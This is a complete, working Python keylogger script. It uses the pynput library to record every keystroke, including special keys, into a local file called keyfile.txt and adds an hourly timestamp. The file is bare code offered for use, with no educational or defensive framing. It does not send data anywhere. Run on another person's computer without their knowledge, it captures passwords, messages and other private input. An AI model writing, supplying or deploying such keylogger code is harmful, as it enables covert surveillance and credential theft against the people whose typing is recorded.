from pynput import keyboard
from datetime import datetime, timedelta

# Initialize variables
last_logged_time = datetime.now()

# Function to handle key presses
def keypressed(key):
    global last_logged_time
    current_time = datetime.now()

    try:
        # Check if an hour has passed since the last timestamp
        if current_time - last_logged_time >= timedelta(hours=1):
            # Write timestamp to file
            with open("keyfile.txt", 'a') as logkey:
                timestamp = current_time.strftime('%Y-%m-%d %H:%M:%S')
                logkey.write(f"\n--- Timestamp: {timestamp} ---\n")
            last_logged_time = current_time  # Reset timer after logging the timestamp

        # Log the keypress
        with open("keyfile.txt", 'a') as logkey:
            if hasattr(key, 'char') and key.char is not None:
                # Log character keys
                logkey.write(key.char)
            else:
                # Log special keys
                logkey.write(f'[{key}]')

    except Exception as e:
        print(f"Error: {e}")

def main():
    # Create a listener to detect keypress events
    with keyboard.Listener(on_press=keypressed) as listener:
        listener.join()  # Keep the listener running

if __name__ == "__main__":
    print("Keylogger started... Press 'Ctrl + C' to stop.")
    main()
